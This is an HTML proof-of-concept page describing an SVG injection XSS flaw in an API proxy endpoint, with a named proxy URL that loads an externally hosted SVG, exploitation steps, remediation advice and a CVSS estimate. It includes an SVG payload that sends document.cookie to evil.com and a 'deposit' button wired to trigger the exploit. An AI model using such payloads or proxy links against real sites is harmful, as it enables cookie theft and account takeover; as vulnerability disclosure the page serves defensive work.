<body>
    <div class="container">
        <h1>üîì SVG INJECTION VULNERABILITY PoC</h1>
        <p class="subtitle">Proof of Concept - API Proxy Exploitation</p>
        
        <div class="section">
            <h2>üìã Vulnerability Summary</h2>
            <div class="vulnerability-info">
                <p><strong>Severity:</strong> <span class="severity">CRITICAL</span></p>
                <p><strong>Vulnerability Type:</strong> SVG Injection leading to XSS</p>
                <p><strong>Affected Endpoint:</strong></p>
                <div class="code-block">locallab/fun/api/proxy?url=https://raw.githubusercontent.com/mrowl404notfound-a11y/sqdqsd/refs/heads/main/1337x.svg</div>
            </div>
        </div>

        <div class="section">
            <h2>‚ö†Ô∏è Security Impact</h2>
            <ul class="impact-list">
                <li>Cross-Site Scripting (XSS) through SVG injection</li>
                <li>Session hijacking and cookie theft</li>
                <li>User credential harvesting</li>
                <li>Phishing attacks via redirect manipulation</li>
                <li>Complete account takeover potential</li>
                <li>Data exfiltration from victim's browser</li>
            </ul>
        </div>

        <div class="section">
            <h2>üîß Exploitation Steps</h2>
            <div class="step">
                <span class="step-number">Step 1:</span> Attacker hosts malicious SVG file on external server (GitHub in this case)
            </div>
            <div class="step">
                <span class="step-number">Step 2:</span> SVG contains embedded JavaScript within foreignObject or script tags
            </div>
            <div class="step">
                <span class="step-number">Step 3:</span> Vulnerable proxy endpoint fetches and serves the SVG without sanitization
            </div>
            <div class="step">
                <span class="step-number">Step 4:</span> Victim clicks on the crafted link or element
            </div>
            <div class="step">
                <span class="step-number">Step 5:</span> Malicious JavaScript executes in victim's browser context
            </div>
        </div>

        <div class="section">
            <h2>üíâ Malicious SVG Payload Example</h2>
            <div class="code-block">&lt;svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"&gt;
  &lt;foreignObject width="100" height="100"&gt;
    &lt;div xmlns="http://www.w3.org/1999/xhtml"&gt;
      &lt;script&gt;
        // Malicious payload
        window.location.href='https://evil.com/steal?cookie='+document.cookie;
      &lt;/script&gt;
    &lt;/div&gt;
  &lt;/foreignObject&gt;
&lt;/svg&gt;</div>
        </div>

        <div class="section">
            <h2>üéØ Live Demonstration</h2>
            <div class="warning">
                ‚ö†Ô∏è WARNING: Clicking the button below will demonstrate the vulnerability by triggering a redirect. This proves the proxy endpoint allows execution of external content without proper sanitization.
            </div>
            
            <div class="demo-section">
                <h3 style="color: #ff0000; margin-bottom: 20px;">VULNERABLE DEPOSIT BUTTON</h3>
                <p style="margin-bottom: 20px; color: #ffff00;">This simulates the vulnerable deposit functionality that redirects users through malicious SVG content</p>
                <button onclick="triggerVulnerability()">üí∞ DEPOSIT (CLICK TO EXPLOIT)</button>
            </div>
        </div>

        <div class="section">
            <h2>üõ°Ô∏è Recommended Remediation</h2>
            <div class="code-block">1. Implement strict Content Security Policy (CSP)
2. Sanitize all SVG content before serving
3. Validate and whitelist allowed proxy URLs
4. Set proper Content-Type headers
5. Use X-Content-Type-Options: nosniff
6. Implement server-side SVG parsing and validation
7. Remove script execution capabilities from SVG
8. Use DOMPurify or similar sanitization libraries</div>
        </div>

        <div class="section">
            <h2>üìä CVSS Score Estimation</h2>
            <div class="vulnerability-info">
                <p><strong>Base Score:</strong> 8.8 (HIGH)</p>
                <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</p>
                <p><strong>Attack Vector:</strong> Network</p>
                <p><strong>Attack Complexity:</strong> Low</p>
                <p><strong>Privileges Required:</strong> None</p>
                <p><strong>User Interaction:</strong> Required</p>
            </div>
        </div>
